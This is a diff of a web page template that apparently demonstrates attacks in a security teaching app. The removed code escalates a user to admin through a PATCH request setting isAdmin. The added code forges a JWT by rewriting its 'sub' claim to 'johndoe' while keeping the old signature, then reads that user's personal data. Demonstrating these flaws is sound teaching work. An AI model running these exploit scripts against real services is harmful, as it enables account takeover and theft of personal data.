@@ -1,12 +1,12 @@
 {{#section 'head'}}
+
     <script>
-        window.API_BASE_URL = '/auth/v2';
+        window.API_BASE_URL = '/jwt/v1';
     </script>
 
     <script>
-
         const apiBaseUrl = window.API_BASE_URL;
-        let token;
+        const targetUserName = 'johndoe';
 
         fetch(`${apiBaseUrl}/tokens`, {
             method: 'POST',
@@ -19,28 +19,27 @@
             })
         })
                 .then((response) => response.json())
-                /* Update isAdmin property. */
                 .then((data) => {
 
-                    token = data.token;
+                    let token = data.token;
 
-                    return fetch(`${apiBaseUrl}/users/${data.userId}`, {
-                        method: 'PATCH',
+                    let [b64Alg, b64TokenData, b64Signature] = token.split('.');
+
+                    let tokenData = JSON.parse(atob(b64TokenData));
+
+                    tokenData.sub = targetUserName;
+
+                    b64TokenData = btoa(JSON.stringify(tokenData)).replace(/=/g, '');
+
+                    token = [b64Alg, b64TokenData, b64Signature].join('.');
+
+                    return fetch(`${apiBaseUrl}/users/${targetUserName}`, {
                         headers: {
-                            'Authorization': `Bearer ${token}`,
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            isAdmin: true
-                        })
+                            'Authorization': `Bearer ${token}`
+                        }
                     });
+
                 })
-                .then(() => fetch(`${apiBaseUrl}/users/johndoe`, {
-                    headers: {
-                        'Authorization': `Bearer ${token}`
-                    }
-                }))
-                /* Display result. */
                 .then((response) => response.json())
                 .then((data) => {
 
@@ -60,13 +59,13 @@
                     outputElement.querySelector('.wt-firstname').textContent = data.firstName;
                     outputElement.querySelector('.wt-lastname').textContent = data.lastName;
                     outputElement.querySelector('.wt-address').textContent = data.address;
+
                 });
 
     </script>
 
 {{/section}}
 
-<p>Making Foo BAR admin then using he's credentials to get John DOE's data.</p>
+<p>Using Foo BAR's credentials to get a JWT that we forge as John DOE's token.</p>
 
-<h2>Leaked data:</h2>
 <div id="wt-output"></div>
